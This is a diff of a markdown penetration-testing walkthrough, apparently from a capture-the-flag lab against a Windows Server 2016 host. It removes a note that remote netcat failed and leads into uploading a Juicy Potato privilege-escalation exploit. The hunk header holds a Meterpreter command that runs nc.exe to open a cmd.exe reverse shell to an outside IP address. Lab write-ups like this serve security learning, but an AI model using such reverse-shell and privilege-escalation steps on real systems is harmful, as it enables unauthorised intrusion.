@@ -152,14 +152,6 @@ msf > execute -f nc.exe -a "-e cmd.exe 10.10.16.133 4443"
 
 ---
 
-## Remote Netcat does not work.
-
-What's better is that `sysinfo` returns `Windows NT SHIELD 10.0 build 14393 (Windows Server 2016) i586` but the command line only accepts unix commands.
-
-It does not recognize Window commands.
-
----
-
 ## Next step is to exploit with a local binary.
 
 [Rotten Potato](https://github.com/ohpe/juicy-potato) exploit can be uploaded onto the server and we can try to run it.
